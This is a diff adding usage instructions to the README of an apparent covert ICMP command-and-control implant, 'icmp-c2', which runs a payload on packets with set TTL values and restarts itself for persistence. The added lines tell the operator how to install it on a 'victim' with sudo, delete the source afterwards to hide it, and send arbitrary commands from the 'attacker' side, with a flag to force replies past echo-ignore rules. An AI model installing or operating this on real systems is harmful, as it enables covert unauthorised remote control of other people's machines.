@@ -32,3 +32,12 @@ If IP packet has a ttl of 45, 65, 31, or 17, the service will execute the payloa
 - Should make the code timeout and send decoy response to avoid suspicion -->
 
 Multithreading and restart on failure added for persistence.
+
+For victim:
+git clone then run `sudo ./install.sh` from within icmp-c2 directory
+Once installed, source directory can be deleted 
+
+For attacker:
+run `python3 send-command.py ls -l`, can replace with any command
+
+To force a reply even if ignore echo rule is turned on, use the `-f` flag as `argv[1]`
